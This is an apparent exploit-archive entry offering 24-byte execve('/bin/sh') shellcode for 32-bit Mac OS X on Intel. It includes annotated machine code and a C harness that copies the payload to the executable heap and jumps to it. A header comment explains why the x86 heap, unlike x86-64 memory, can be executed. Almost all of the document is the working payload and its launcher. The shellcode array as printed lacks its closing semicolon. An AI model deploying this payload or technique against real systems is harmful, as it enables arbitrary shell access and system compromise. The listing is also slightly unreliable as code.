/*
Title : OSX/x86 intel - execve(/bin/sh) - 24 bytes
Type : Shellcode
Author : Simon Derouineau - simon.derouineau [AT] ingesup.com
Platform : Mac OSX/Intel. Tested on 10.6.4 Build 10F569

Informations : This code has to be compiled with gcc -m32 switch  on 10.6.0+

More informations : x86-64 code is more secured than x86 code on OSX platform :
Canaries are added, Stack and heap are non-executable, etc.

Also, cat /var/db/dyld/dyld_shared_cache_x86_64.map shows that no memory can be
mapped with WX flags, while it's possible with x86 code ( according to  /var/db/dyld/dyld_shared_cache_i386.map).

The method used here is the easier one, heap is executable in x86 applications,
as described in "The Mac Hacker's Handbook", written by Charlie Miller.

The trick is to memcopy the shellcode to the heap before executing it.

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>



char shellcode[]= 	"\x31\xC0" 			// xor eax,eax
			"\x50"				// push eax
			"\x68\x2F\x2F\x73\x68"		// push dword
			"\x68\x2F\x62\x69\x6E"		// push dword
			"\x89\xE3"			// mov ebx,esp
			"\x50\x50\x53"			// push eax, push eax, push ebx
			"\xB0\x3B"			// mov al,0x3b
			"\x6A\x2A"			// push byte 0x2a
			"\xCD\x80"			// int 0x80


int main(int argc, char *argv[]){
void (*f)();
char *x = malloc(sizeof(shellcode));
memcpy(x, shellcode, sizeof(shellcode));
f = (void (*)()) x;
f();
}